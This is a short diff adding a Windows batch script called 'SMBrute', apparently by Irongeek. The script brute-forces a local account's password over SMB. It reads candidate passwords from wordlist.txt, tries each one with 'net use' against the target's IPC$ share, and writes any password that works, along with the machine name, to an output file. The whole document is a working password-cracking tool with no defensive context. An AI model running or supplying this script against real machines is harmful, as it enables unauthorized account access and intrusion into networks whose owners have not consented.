@@ -1,0 +1,18 @@
+SMB brute - smbbrute
+
+@echo off
+echo SMBrute Script, Written by Irongeek: http://www.irongeek.com
+echo Usage: smbrute machinename local-account-to-crack
+echo Output: log.txt(debugging log) and output.txt (Holds password and machine name)
+echo Stuff: make sure that you have a text file with your word list called
+echo "wordlist.txt" in the same working directory.
+if  "%1"=="" goto end
+if  "%2"=="" goto end
+del log.txt
+FOR /F "tokens=1" %%i in (wordlist.txt) do ^
+echo %%i && ^
+net use \\%1\ipc$ %%i /u:%1\%2 2>>log.txt && ^
+echo %time% %date% >> outfile.txt && ^
+echo \\%1\ipc$ acct: %2  pass: %%i >> outfile.txt && goto end
+:end
+echo *****Done*****
